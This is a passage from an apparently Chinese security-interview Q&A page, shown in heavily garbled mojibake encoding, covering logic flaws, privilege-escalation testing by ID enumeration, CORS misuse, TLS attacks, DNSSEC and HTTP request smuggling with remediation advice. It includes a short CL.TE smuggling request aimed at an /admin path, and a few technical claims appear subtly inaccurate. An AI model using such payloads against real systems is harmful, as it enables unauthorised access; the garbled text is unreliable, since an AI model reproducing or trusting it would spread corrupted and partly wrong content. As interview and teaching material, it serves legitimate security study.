¡éªŒç›¸å…³é£é™©ï¼šæœªæˆæƒè®¿é—®ã€éæ­£å¸¸è´¦æˆ·çŠ¶æ€ã€èº«ä»½å¯æšä¸¾ã€æ°´å¹³è¶Šæƒã€å‚ç›´è¶Šæƒç­‰ã€‚</li><li>æ¥å£é€»è¾‘å®ç°ä¸ä¸€è‡´ï¼šä¸åŒåè®®å®ç°ä¸ä¸€è‡´ã€åŒç±»äº§å“ä¸åŒé€»è¾‘ã€ä¸åŒé˜¶æ®µé€»è¾‘ä¸ä¸€è‡´-æµç¨‹ç»•è¿‡ã€‚</li><li>ä¸å®‰å…¨çš„å¯ä¿¡ç«¯æ•°æ®ï¼šAPPæ•°æ®è¢«ç¯¡æ”¹æˆ–ä¼ªé€ ã€‚</li><li>é¢„è®¾è¦æ±‚ä¸ç¬¦åˆï¼šä¾èµ–æ¡ä»¶ä¸å®‰å…¨-ä¸šåŠ¡æ ¡éªŒå±æ€§è®¾è®¡ã€äººå·¥å®¢æœå®¹æ˜“è¢«éª—-ä¸šåŠ¡æµç¨‹è®¾è®¡ã€‚</li><li>æ»¥ç”¨åˆç†ä¸šåŠ¡éœ€æ±‚ï¼šå¦‚APIé€Ÿç‡é™åˆ¶è¢«ç»•è¿‡ã€ä¿ƒé”€æ´»åŠ¨è¢«æ¶æ„åˆ©ç”¨ç­‰ã€‚</li></ul><hr><h3 id="å“ªäº›è´¦æˆ·çŠ¶æ€ä¼šå¯¼è‡´é¢„æœŸå¤–çš„é£é™©ï¼š"><a href="#å“ªäº›è´¦æˆ·çŠ¶æ€ä¼šå¯¼è‡´é¢„æœŸå¤–çš„é£é™©ï¼š" class="headerlink" title="å“ªäº›è´¦æˆ·çŠ¶æ€ä¼šå¯¼è‡´é¢„æœŸå¤–çš„é£é™©ï¼š"></a>å“ªäº›è´¦æˆ·çŠ¶æ€ä¼šå¯¼è‡´é¢„æœŸå¤–çš„é£é™©ï¼š</h3><ul><li>æ³¨é”€è´¦æˆ·ä»å¯è¿›è¡Œæ“ä½œã€‚</li><li>ç¦ç”¨è´¦æˆ·ç»•è¿‡ç¦ç”¨é€»è¾‘ã€‚</li><li>é£æ§è´¦æˆ·æ‰§è¡Œæ•æ„Ÿæ“ä½œã€‚</li><li>å¸æ³•å†»ç»“è´¦æˆ·è¿›è¡Œèµ„é‡‘è½¬ç§»ã€‚</li></ul><hr><h3 id="èº«ä»½æ ‡è¯†æ˜æ–‡ä¼ è¾“ä¼šå¯¼è‡´çš„é£é™©ï¼š"><a href="#èº«ä»½æ ‡è¯†æ˜æ–‡ä¼ è¾“ä¼šå¯¼è‡´çš„é£é™©ï¼š" class="headerlink" title="èº«ä»½æ ‡è¯†æ˜æ–‡ä¼ è¾“ä¼šå¯¼è‡´çš„é£é™©ï¼š"></a>èº«ä»½æ ‡è¯†æ˜æ–‡ä¼ è¾“ä¼šå¯¼è‡´çš„é£é™©ï¼š</h3><ul><li>èº«ä»½ç›—ç”¨ï¼šæ”»å‡»è€…å¯é€šè¿‡æˆªè·æ˜æ–‡èº«ä»½æ ‡è¯†ï¼Œä¼ªè£…æˆå…¶ä»–ç”¨æˆ·ã€‚</li><li>ä¼šè¯åŠ«æŒï¼šæ”»å‡»è€…å¯èƒ½é€šè¿‡æ˜æ–‡èº«ä»½æ ‡è¯†æ¥ç®¡ç”¨æˆ·ä¼šè¯ã€‚</li></ul><hr><h3 id="æ°´å¹³è¶Šæƒè§¦å‘ç‚¹ä¼šå­˜åœ¨çš„ä½ç½®ï¼š"><a href="#æ°´å¹³è¶Šæƒè§¦å‘ç‚¹ä¼šå­˜åœ¨çš„ä½ç½®ï¼š" class="headerlink" title="æ°´å¹³è¶Šæƒè§¦å‘ç‚¹ä¼šå­˜åœ¨çš„ä½ç½®ï¼š"></a>æ°´å¹³è¶Šæƒè§¦å‘ç‚¹ä¼šå­˜åœ¨çš„ä½ç½®ï¼š</h3><ul><li>Cookiesï¼šè¢«æ¶æ„ä¿®æ”¹ä»¥è®¿é—®å…¶ä»–ç”¨æˆ·ä¼šè¯ã€‚</li><li>è‡ªå®šä¹‰Headerï¼šå¦‚X-Custom-Headerè¢«åˆ©ç”¨è¿›è¡Œè¶Šæƒè®¿é—®ã€‚</li><li>URL Pathï¼šè·¯å¾„éå†æˆ–æ“ä½œå…¶ä»–ç”¨æˆ·èµ„æºã€‚</li><li>URL Param Valueï¼šå‚æ•°å€¼è¢«ä¿®æ”¹ä»¥è®¿é—®æœªæˆæƒèµ„æºã€‚</li><li>URL Param JSONï¼šJSONå‚æ•°è¢«ç¯¡æ”¹å¯¼è‡´è¶Šæƒã€‚</li><li>Body Formã€Body JSONã€Body XMLï¼šè¯·æ±‚ä½“ä¸­æ•°æ®è¢«ç¯¡æ”¹ã€‚</li><li>è‡ªå®šä¹‰åè®®çš„è‡ªå®šä¹‰å­—æ®µï¼šç”¨äºè¶Šæƒè®¿é—®çš„éšè—å‚æ•°ã€‚</li></ul><hr><h3 id="æ°´å¹³è¶Šæƒæœ‰å“ªå‡ ç§æ£€æµ‹æ–¹å¼ï¼š"><a href="#æ°´å¹³è¶Šæƒæœ‰å“ªå‡ ç§æ£€æµ‹æ–¹å¼ï¼š" class="headerlink" title="æ°´å¹³è¶Šæƒæœ‰å“ªå‡ ç§æ£€æµ‹æ–¹å¼ï¼š"></a>æ°´å¹³è¶Šæƒæœ‰å“ªå‡ ç§æ£€æµ‹æ–¹å¼ï¼š</h3><ul><li>æšä¸¾æ£€æµ‹ï¼šå¯¹æ•°å­—IDè¿›è¡Œé€’å¢æˆ–é€’å‡æµ‹è¯•ã€‚</li><li>è´¦æˆ·äº’æµ‹ï¼šä½¿ç”¨ä¸¤ä¸ªä¸åŒæƒé™è´¦æˆ·ç›¸äº’è®¿é—®èµ„æºã€‚</li></ul><hr><h3 id="é€šè¿‡æ•°å­—åŠ å‡éå†æˆ–é€šè¿‡ä¸¤ä¸ªè´¦å·äº’æµ‹çš„æ–¹å¼è¿›è¡Œæ°´å¹³è¶Šæƒæµ‹è¯•çš„ä¼˜åŠ£åŠ¿ï¼š"><a href="#é€šè¿‡æ•°å­—åŠ å‡éå†æˆ–é€šè¿‡ä¸¤ä¸ªè´¦å·äº’æµ‹çš„æ–¹å¼è¿›è¡Œæ°´å¹³è¶Šæƒæµ‹è¯•çš„ä¼˜åŠ£åŠ¿ï¼š" class="headerlink" title="é€šè¿‡æ•°å­—åŠ å‡éå†æˆ–é€šè¿‡ä¸¤ä¸ªè´¦å·äº’æµ‹çš„æ–¹å¼è¿›è¡Œæ°´å¹³è¶Šæƒæµ‹è¯•çš„ä¼˜åŠ£åŠ¿ï¼š"></a>é€šè¿‡æ•°å­—åŠ å‡éå†æˆ–é€šè¿‡ä¸¤ä¸ªè´¦å·äº’æµ‹çš„æ–¹å¼è¿›è¡Œæ°´å¹³è¶Šæƒæµ‹è¯•çš„ä¼˜åŠ£åŠ¿ï¼š</h3><ul><li>æ•°å­—åŠ å‡éå†ï¼š<ul><li>ä¼˜åŠ¿ï¼šç›´æ¥é’ˆå¯¹æ•°å­—å‹èµ„æºIDï¼Œæ“ä½œç®€å•ã€‚</li><li>åŠ£åŠ¿ï¼šåªèƒ½æ£€æµ‹è¿ç»­æ•°å­—IDï¼Œå¯èƒ½é—æ¼éè¿ç»­æˆ–éæ•°å­—IDçš„è¶Šæƒï¼Œä¸”å¯¹ä¸šåŠ¡æœ‰æŸã€‚</li></ul></li><li>è´¦å·äº’æµ‹ï¼š<ul><li>ä¼˜åŠ¿ï¼šæ— éœ€éå†ï¼Œé™ä½è¢«å‘ç°é£é™©ï¼Œä¸ä¼šå¯¹ä»–äººæ•°æ®äº§ç”Ÿå½±å“ã€‚</li><li>åŠ£åŠ¿ï¼šé…ç½®å¤šä¸ªè´¦å·æµ‹è¯•è¾ƒä¸ºç¹çï¼Œå½“å‚æ•°å¤šä¸”ç›¸äº’å…³è”æ—¶æ•ˆç‡è¾ƒä½ã€‚</li></ul></li></ul><hr><h3 id="CORS-åŸç†ã€åˆ©ç”¨åŠä¿®å¤ï¼Ÿ-1"><a href="#CORS-åŸç†ã€åˆ©ç”¨åŠä¿®å¤ï¼Ÿ-1" class="headerlink" title="CORS åŸç†ã€åˆ©ç”¨åŠä¿®å¤ï¼Ÿ"></a>CORS åŸç†ã€åˆ©ç”¨åŠä¿®å¤ï¼Ÿ</h3><p>CORS åŸç†ï¼š<br>è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰æ˜¯Webæµè§ˆå™¨å®ç°çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºé™åˆ¶Webé¡µé¢å¦‚ä½•è¯·æ±‚å¦ä¸€åŸŸåä¸‹çš„èµ„æºã€‚å…¶åŸç†æ˜¯é€šè¿‡åœ¨HTTPå“åº”å¤´ä¸­åŠ å…¥<code>Access-Control-Allow-Origin</code>å­—æ®µæ¥æŒ‡å®šå“ªäº›å¤–éƒ¨åŸŸå¯ä»¥è®¿é—®è¯¥èµ„æºã€‚</p><p>åˆ©ç”¨æ–¹å¼ï¼š<br>æ”»å‡»è€…å¯èƒ½åˆ©ç”¨ä¸å½“é…ç½®çš„CORSç­–ç•¥ï¼Œä½¿å¾—æ¶æ„ç½‘ç«™èƒ½å¤Ÿè®¿é—®æˆ–ä¿®æ”¹ç›®æ ‡åŸŸä¸‹çš„æ•æ„Ÿæ•°æ®ã€‚</p><h2 id="ä¿®å¤æ–¹æ¡ˆï¼š-é…ç½®ä¸¥æ ¼çš„CORSç­–ç•¥ï¼Œä»…å…è®¸ä¿¡ä»»çš„æºè®¿é—®èµ„æºã€‚-ä½¿ç”¨é¢„æ£€è¯·æ±‚ï¼ˆOPTIONSè¯·æ±‚ï¼‰ï¼Œåœ¨å®é™…è¯·æ±‚ä¹‹å‰è¿›è¡Œæƒé™æ ¡éªŒã€‚"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š-é…ç½®ä¸¥æ ¼çš„CORSç­–ç•¥ï¼Œä»…å…è®¸ä¿¡ä»»çš„æºè®¿é—®èµ„æºã€‚-ä½¿ç”¨é¢„æ£€è¯·æ±‚ï¼ˆOPTIONSè¯·æ±‚ï¼‰ï¼Œåœ¨å®é™…è¯·æ±‚ä¹‹å‰è¿›è¡Œæƒé™æ ¡éªŒã€‚" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š- é…ç½®ä¸¥æ ¼çš„CORSç­–ç•¥ï¼Œä»…å…è®¸ä¿¡ä»»çš„æºè®¿é—®èµ„æºã€‚- ä½¿ç”¨é¢„æ£€è¯·æ±‚ï¼ˆOPTIONSè¯·æ±‚ï¼‰ï¼Œåœ¨å®é™…è¯·æ±‚ä¹‹å‰è¿›è¡Œæƒé™æ ¡éªŒã€‚"></a>ä¿®å¤æ–¹æ¡ˆï¼š<br>- é…ç½®ä¸¥æ ¼çš„CORSç­–ç•¥ï¼Œä»…å…è®¸ä¿¡ä»»çš„æºè®¿é—®èµ„æºã€‚<br>- ä½¿ç”¨é¢„æ£€è¯·æ±‚ï¼ˆOPTIONSè¯·æ±‚ï¼‰ï¼Œåœ¨å®é™…è¯·æ±‚ä¹‹å‰è¿›è¡Œæƒé™æ ¡éªŒã€‚</h2><h3 id="æŸä¸ªAPPçš„æŸä¸ªåŠŸèƒ½æŒ‰é’®æ˜¯ç°è‰²ä¸å¯ç”¨çŠ¶æ€ï¼Œå¦‚ä½•ç»•è¿‡å…¶é™åˆ¶ï¼Ÿ"><a href="#æŸä¸ªAPPçš„æŸä¸ªåŠŸèƒ½æŒ‰é’®æ˜¯ç°è‰²ä¸å¯ç”¨çŠ¶æ€ï¼Œå¦‚ä½•ç»•è¿‡å…¶é™åˆ¶ï¼Ÿ" class="headerlink" title="æŸä¸ªAPPçš„æŸä¸ªåŠŸèƒ½æŒ‰é’®æ˜¯ç°è‰²ä¸å¯ç”¨çŠ¶æ€ï¼Œå¦‚ä½•ç»•è¿‡å…¶é™åˆ¶ï¼Ÿ"></a>æŸä¸ªAPPçš„æŸä¸ªåŠŸèƒ½æŒ‰é’®æ˜¯ç°è‰²ä¸å¯ç”¨çŠ¶æ€ï¼Œå¦‚ä½•ç»•è¿‡å…¶é™åˆ¶ï¼Ÿ</h3><ul><li>ä¿®æ”¹å‰ç«¯æŒ‰é’®å±æ€§ï¼šç›´æ¥ä¿®æ”¹å‰ç«¯é¡µé¢å…ƒç´ çš„å±æ€§ï¼Œä½¿å…¶å¯ç”¨ã€‚</li><li>åˆ†æåç«¯æ¥å£ï¼šæ£€æŸ¥æŒ‰é’®å¯¹åº”çš„åç«¯APIï¼Œå°è¯•ç›´æ¥è°ƒç”¨æ¥å£ä»¥ç»•è¿‡å‰ç«¯é™åˆ¶ã€‚</li><li>å¤šåè®®æµ‹è¯•ï¼šå°è¯•é€šè¿‡ä¸åŒåè®®ï¼ˆHTTPã€WSDLã€RESTã€GraphQLï¼‰è°ƒç”¨APIï¼Œçœ‹æ˜¯å¦èƒ½ç»•è¿‡é™åˆ¶ã€‚</li><li>è·¨å¹³å°æµ‹è¯•ï¼šå¦‚æœAPPä¸ŠæŒ‰é’®ä¸å¯ç”¨ï¼Œå°è¯•åœ¨PCæˆ–å…¶ä»–å¹³å°ä¸Šæ“ä½œï¼Œçœ‹æ˜¯å¦èƒ½ç»•è¿‡é™åˆ¶ã€‚</li></ul><hr><h3 id="æµç¨‹ç»•è¿‡æ¼æ´å¦‚ä½•æŠ½è±¡ç†è§£å½’ç±»ï¼Ÿ"><a href="#æµç¨‹ç»•è¿‡æ¼æ´å¦‚ä½•æŠ½è±¡ç†è§£å½’ç±»ï¼Ÿ" class="headerlink" title="æµç¨‹ç»•è¿‡æ¼æ´å¦‚ä½•æŠ½è±¡ç†è§£å½’ç±»ï¼Ÿ"></a>æµç¨‹ç»•è¿‡æ¼æ´å¦‚ä½•æŠ½è±¡ç†è§£å½’ç±»ï¼Ÿ</h3><ul><li>çŠ¶æ€å˜æ›´ä¸ä¸€è‡´ï¼šåˆ›å»ºæ—¶æƒé™æ ¡éªŒä¸¥æ ¼ï¼Œåç»­çŠ¶æ€å˜æ›´æ—¶æƒé™è¦æ±‚ä¸ä¸€è‡´ã€‚</li><li>æ­¥éª¤è¦æ±‚ä¸ä¸€è‡´ï¼šæµç¨‹ä¸­æŸä¸ªæ­¥éª¤è¦æ±‚ä¸¥æ ¼ï¼Œåç»­æ­¥éª¤è¦æ±‚ä¸ä¸€è‡´ï¼Œå¦‚è¾“å…¥å¯†ç åæœªæ ¡éªŒã€‚</li><li>å¹¶å‘é€»è¾‘æ§åˆ¶ï¼šå¹¶å‘æ‰§è¡Œæµç¨‹ï¼Œå¦‚å¤šçª—å£åŒæ—¶æ”¯ä»˜ï¼Œä½¿ä¼˜æƒ å¤šæ¬¡ä½¿ç”¨ã€‚</li><li>ç‰¹æ®Šæ—¶æœŸé€»è¾‘ç»•è¿‡ï¼šå¦‚å¤§ä¿ƒæ—¶æœŸæ ¡éªŒæœºåˆ¶é™çº§ï¼Œå¯¼è‡´æµç¨‹ç»•è¿‡ã€‚</li><li>é€»è¾‘æ§åˆ¶ç¼ºé™·ï¼šå¼€å‘ä¸­é€»è¾‘æ§åˆ¶ä¸ä¸¥è°¨ï¼Œå¦‚å¤šæ¡ä»¶åˆ¤æ–­ä¸­é—æ¼å…³é”®æ ¡éªŒã€‚</li></ul><hr><h3 id="TLS-1-2-åè®®äº¤äº’è¿‡ç¨‹ä»¥åŠæ”»å‡»æ–¹æ³•ï¼Ÿ"><a href="#TLS-1-2-åè®®äº¤äº’è¿‡ç¨‹ä»¥åŠæ”»å‡»æ–¹æ³•ï¼Ÿ" class="headerlink" title="TLS 1.2 åè®®äº¤äº’è¿‡ç¨‹ä»¥åŠæ”»å‡»æ–¹æ³•ï¼Ÿ"></a><strong>TLS 1.2 åè®®äº¤äº’è¿‡ç¨‹ä»¥åŠæ”»å‡»æ–¹æ³•ï¼Ÿ</strong></h3><p><strong>TLS 1.2 äº¤äº’è¿‡ç¨‹</strong>ï¼š</p><ol><li><strong>å®¢æˆ·ç«¯ Hello</strong>ï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€æ”¯æŒçš„ TLS ç‰ˆæœ¬ã€åŠ å¯†å¥—ä»¶ã€éšæœºæ•°ç­‰ã€‚</li><li><strong>æœåŠ¡å™¨ Hello</strong>ï¼šæœåŠ¡å™¨é€‰æ‹© TLS ç‰ˆæœ¬ã€åŠ å¯†ç®—æ³•ï¼Œå¹¶è¿”å›è‡ªå·±çš„è¯ä¹¦ã€‚</li><li><strong>å¯†é’¥äº¤æ¢</strong>ï¼šåŸºäº RSA æˆ– ECDHE äº¤æ¢å¯†é’¥ï¼Œåå•†å¯¹ç§°åŠ å¯†å¯†é’¥ã€‚</li><li><strong>Finished</strong>ï¼šåŒæ–¹ä½¿ç”¨åå•†å‡ºçš„å¯†é’¥å®Œæˆæ¡æ‰‹ï¼Œå¼€å§‹åŠ å¯†é€šä¿¡ã€‚</li></ol><p><strong>æ”»å‡»æ–¹æ³•</strong>ï¼š</p><ul><li><strong>TLS é™çº§æ”»å‡»</strong>ï¼šæ”»å‡»è€…å¹²æ‰° TLS æ¡æ‰‹ï¼Œè¿«ä½¿å®¢æˆ·ç«¯ä½¿ç”¨è¾ƒä½ç‰ˆæœ¬çš„ TLSï¼ˆå¦‚ POODLEï¼‰ã€‚</li><li><strong>ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰</strong>ï¼šæ”»å‡»è€…æ‹¦æˆªå¹¶ä¿®æ”¹ TLS æ¡æ‰‹ï¼Œæ’å…¥æ¶æ„ CA è¯ä¹¦ï¼Œè§£å¯†é€šä¿¡ã€‚</li><li><strong>ä¼šè¯åŠ«æŒ</strong>ï¼šé€šè¿‡çªƒå–ä¼šè¯ç¥¨æ®ï¼ˆSession Ticketï¼‰è·å–ç”¨æˆ·ä¼šè¯ã€‚</li><li><strong>BEAST æ”»å‡»</strong>ï¼šåˆ©ç”¨ CBC æ¨¡å¼å¡«å……æ¼æ´ï¼Œç ´è§£ä¼šè¯å¯†æ–‡ã€‚</li></ul><h2 id="ä¿®å¤æ–¹æ¡ˆï¼š-å¼ºåˆ¶ä½¿ç”¨-TLS-1-2-ï¼Œç¦ç”¨ä½ç‰ˆæœ¬ã€‚-å¯ç”¨-HSTSï¼Œé˜²æ­¢é™çº§æ”»å‡»ã€‚-ä½¿ç”¨-PFSï¼ˆPerfect-Forward-Secrecyï¼‰ï¼Œé˜²æ­¢å¯†é’¥æ³„éœ²å½±å“å†å²æ•°æ®ã€‚"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š-å¼ºåˆ¶ä½¿ç”¨-TLS-1-2-ï¼Œç¦ç”¨ä½ç‰ˆæœ¬ã€‚-å¯ç”¨-HSTSï¼Œé˜²æ­¢é™çº§æ”»å‡»ã€‚-ä½¿ç”¨-PFSï¼ˆPerfect-Forward-Secrecyï¼‰ï¼Œé˜²æ­¢å¯†é’¥æ³„éœ²å½±å“å†å²æ•°æ®ã€‚" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š- å¼ºåˆ¶ä½¿ç”¨ TLS 1.2+ï¼Œç¦ç”¨ä½ç‰ˆæœ¬ã€‚- å¯ç”¨ HSTSï¼Œé˜²æ­¢é™çº§æ”»å‡»ã€‚- ä½¿ç”¨ PFSï¼ˆPerfect Forward Secrecyï¼‰ï¼Œé˜²æ­¢å¯†é’¥æ³„éœ²å½±å“å†å²æ•°æ®ã€‚"></a><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- å¼ºåˆ¶ä½¿ç”¨ TLS 1.2+ï¼Œç¦ç”¨ä½ç‰ˆæœ¬ã€‚<br>- å¯ç”¨ HSTSï¼Œé˜²æ­¢é™çº§æ”»å‡»ã€‚<br>- ä½¿ç”¨ PFSï¼ˆPerfect Forward Secrecyï¼‰ï¼Œé˜²æ­¢å¯†é’¥æ³„éœ²å½±å“å†å²æ•°æ®ã€‚</h2><h3 id="HTTP-è¯·æ±‚èµ°ç§ï¼ˆHTTP-Request-Smugglingï¼‰åŸç†"><a href="#HTTP-è¯·æ±‚èµ°ç§ï¼ˆHTTP-Request-Smugglingï¼‰åŸç†" class="headerlink" title="HTTP è¯·æ±‚èµ°ç§ï¼ˆHTTP Request Smugglingï¼‰åŸç†"></a><strong>HTTP è¯·æ±‚èµ°ç§ï¼ˆHTTP Request Smugglingï¼‰åŸç†</strong></h3><p><strong>æ¼æ´åŸç†</strong>ï¼š<br>HTTP è¯·æ±‚èµ°ç§æ˜¯ç”±äºæœåŠ¡å™¨å¯¹ <code>Content-Length</code> å’Œ <code>Transfer-Encoding</code> è§£æä¸ä¸€è‡´å¯¼è‡´çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„ HTTP è¯·æ±‚ï¼Œä½¿ä»£ç†æœåŠ¡å™¨å’Œç›®æ ‡æœåŠ¡å™¨è§£æä¸åŒæ­¥ï¼Œå¯¼è‡´ï¼š</p><ul><li>çªƒå–å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚æ•°æ®</li><li>ç»•è¿‡èº«ä»½éªŒè¯</li><li>è§¦å‘ç¼“å­˜æ±¡æŸ“</li></ul><h2 id="åˆ©ç”¨æ–¹å¼ï¼š-CL-TE-æ”»å‡»ï¼š-ä¿®å¤æ–¹æ¡ˆï¼š-ç»Ÿä¸€-Content-Length-å’Œ-Transfer-Encoding-çš„è§£æé€»è¾‘ã€‚-åœ¨-Web-æœåŠ¡å™¨å’Œä»£ç†æœåŠ¡å™¨ä¸­ç¦ç”¨-Transfer-Encoding-chunkedã€‚-ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„-Web-æœåŠ¡å™¨ï¼Œå¦‚-Nginxã€Apacheï¼Œä¿®å¤å·²çŸ¥æ¼æ´ã€‚"><a href="#åˆ©ç”¨æ–¹å¼ï¼š-CL-TE-æ”»å‡»ï¼š-ä¿®å¤æ–¹æ¡ˆï¼š-ç»Ÿä¸€-Content-Length-å’Œ-Transfer-Encoding-çš„è§£æé€»è¾‘ã€‚-åœ¨-Web-æœåŠ¡å™¨å’Œä»£ç†æœåŠ¡å™¨ä¸­ç¦ç”¨-Transfer-Encoding-chunkedã€‚-ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„-Web-æœåŠ¡å™¨ï¼Œå¦‚-Nginxã€Apacheï¼Œä¿®å¤å·²çŸ¥æ¼æ´ã€‚" class="headerlink" title="åˆ©ç”¨æ–¹å¼ï¼š- CL.TE æ”»å‡»ï¼š  ä¿®å¤æ–¹æ¡ˆï¼š- ç»Ÿä¸€ Content-Length å’Œ Transfer-Encoding çš„è§£æé€»è¾‘ã€‚- åœ¨ Web æœåŠ¡å™¨å’Œä»£ç†æœåŠ¡å™¨ä¸­ç¦ç”¨ Transfer-Encoding: chunkedã€‚- ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„ Web æœåŠ¡å™¨ï¼Œå¦‚ Nginxã€Apacheï¼Œä¿®å¤å·²çŸ¥æ¼æ´ã€‚"></a><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<br>- <strong>CL.TE æ”»å‡»</strong>ï¼š<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br></pre></td></tr></table></figure><br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- ç»Ÿä¸€ <code>Content-Length</code> å’Œ <code>Transfer-Encoding</code> çš„è§£æé€»è¾‘ã€‚<br>- åœ¨ Web æœåŠ¡å™¨å’Œä»£ç†æœåŠ¡å™¨ä¸­ç¦ç”¨ <code>Transfer-Encoding: chunked</code>ã€‚<br>- ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„ Web æœåŠ¡å™¨ï¼Œå¦‚ Nginxã€Apacheï¼Œä¿®å¤å·²çŸ¥æ¼æ´ã€‚</h2><h3 id="DNSSEC-èƒ½è§£å†³ä»€ä¹ˆåœºæ™¯é—®é¢˜ï¼Ÿ"><a href="#DNSSEC-èƒ½è§£å†³ä»€ä¹ˆåœºæ™¯é—®é¢˜ï¼Ÿ" class="headerlink" title="DNSSEC èƒ½è§£å†³ä»€ä¹ˆåœºæ™¯é—®é¢˜ï¼Ÿ"></a><strong>DNSSEC èƒ½è§£å†³ä»€ä¹ˆåœºæ™¯é—®é¢˜ï¼Ÿ</strong></h3><p><strong>ä½œç”¨</strong>ï¼š<br>DNSSECï¼ˆDNS Security Extensionsï¼‰ç”¨äºæä¾› DNS è§£ææ•°æ®çš„å®Œæ•´æ€§å’ŒçœŸå®æ€§ï¼Œé˜²æ­¢ DNS åŠ«æŒã€ç¼“å­˜æ±¡æŸ“ç­‰æ”»å‡»ã€‚</p><p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p><ul><li>é˜²æ­¢ <strong>DNS ä¼ªé€ </strong>ï¼šåˆ©ç”¨æ•°å­—ç­¾åéªŒè¯ DNS è®°å½•çš„çœŸå®æ€§ã€‚</li><li><strong>é˜²ç¼“å­˜æŠ•æ¯’</strong>ï¼šç¡®ä¿è§£æå™¨è·å–çš„æ˜¯æ­£ç¡®çš„ DNS è®°å½•ï¼Œè€Œä¸æ˜¯æ”»å‡»è€…ç¯¡æ”¹çš„æ•°æ®ã€‚</li></ul><h2 id="é™åˆ¶ï¼š-DNSSEC-ä¸èƒ½åŠ å¯†-DNS-æŸ¥è¯¢å†…å®¹ï¼Œä»ç„¶å®¹æ˜“è¢«ç›‘æ§ã€‚-éƒ¨ç½²å¤æ‚ï¼Œä¸”éœ€è¦ä¸Šçº§-DNS-æœåŠ¡å™¨æ”¯æŒã€‚"><a href="#é™åˆ¶ï¼š-DNSSEC-ä¸èƒ½åŠ å¯†-DNS-æŸ¥è¯¢å†…å®¹ï¼Œä»ç„¶å®¹æ˜“è¢«ç›‘æ§ã€‚-éƒ¨ç½²å¤æ‚ï¼Œä¸”éœ€è¦ä¸Šçº§-DNS-æœåŠ¡å™¨æ”¯æŒã€‚" class="headerlink" title="é™åˆ¶ï¼š- DNSSEC ä¸èƒ½åŠ å¯† DNS æŸ¥è¯¢å†…å®¹ï¼Œä»ç„¶å®¹æ˜“è¢«ç›‘æ§ã€‚- éƒ¨ç½²å¤æ‚ï¼Œä¸”éœ€è¦ä¸Šçº§ DNS æœåŠ¡å™¨æ”¯æŒã€‚"></a><strong>é™åˆ¶</strong>ï¼š<br>- DNSSEC ä¸èƒ½åŠ å¯† DNS æŸ¥è¯¢å†…å®¹ï¼Œä»ç„¶å®¹æ˜“è¢«ç›‘æ§ã€‚<br>- éƒ¨ç½²å¤æ‚ï¼Œä¸”éœ€è¦ä¸Šçº§ DNS æœåŠ¡å™¨æ”¯æŒã€‚</h2><h3 id="DNS-è®°å½•ï¼ˆDSã€PTRã€TXTï¼‰ç±»å‹çš„å¸¸è§ä½œç”¨ï¼Ÿ"><a href="#DNS-è®°å½•ï¼ˆDSã€PTRã€TXTï¼‰ç±»å‹çš„å¸¸è§ä½œç”¨ï¼Ÿ" class="headerlink" title="DNS è®°å½•ï¼ˆDSã€PTRã€TXTï¼‰ç±»å‹çš„å¸¸è§ä½œç”¨ï¼Ÿ"></a><strong>DNS è®°å½•ï¼ˆDSã€PTRã€TXTï¼‰ç±»å‹çš„å¸¸è§ä½œç”¨ï¼Ÿ</strong></h3><ul><li><strong>DSï¼ˆDelegation Signerï¼‰</strong>ï¼šDNSSEC ç›¸å…³è®°å½•ï¼Œå­˜å‚¨å­åŸŸçš„å…¬é’¥ä¿¡æ¯ã€‚</li><li><strong>PTRï¼ˆPointer Recordï¼‰</strong>ï¼šç”¨äºåå‘ DNS è§£æï¼Œå°† IP åœ°å€æ˜ å°„å›åŸŸåï¼Œå¸¸ç”¨äºé‚®ä»¶æœåŠ¡å™¨éªŒè¯ã€‚</li><li><strong>TXTï¼ˆText Recordï¼‰</strong>ï¼šå­˜å‚¨ä»»æ„æ–‡æœ¬æ•°æ®ï¼Œå¸¸ç”¨äº SPF è®°å½•ã€é˜²åƒåœ¾é‚®ä»¶ç­‰ã€‚</li></ul><h2 id="ç¤ºä¾‹ï¼š-SPF-è®°å½•ï¼ˆTXTï¼‰ï¼š-ä½œç”¨ï¼šæŒ‡å®šå…è®¸çš„é‚®ä»¶å‘é€æœåŠ¡å™¨ï¼Œé˜²æ­¢ä¼ªé€ é‚®ä»¶ã€‚"><a href="#ç¤ºä¾‹ï¼š-SPF-è®°å½•ï¼ˆTXTï¼‰ï¼š-ä½œç”¨ï¼šæŒ‡å®šå…è®¸çš„é‚®ä»¶å‘é€æœåŠ¡å™¨ï¼Œé˜²æ­¢ä¼ªé€ é‚®ä»¶ã€‚" class="headerlink" title="ç¤ºä¾‹ï¼š- SPF è®°å½•ï¼ˆTXTï¼‰ï¼š    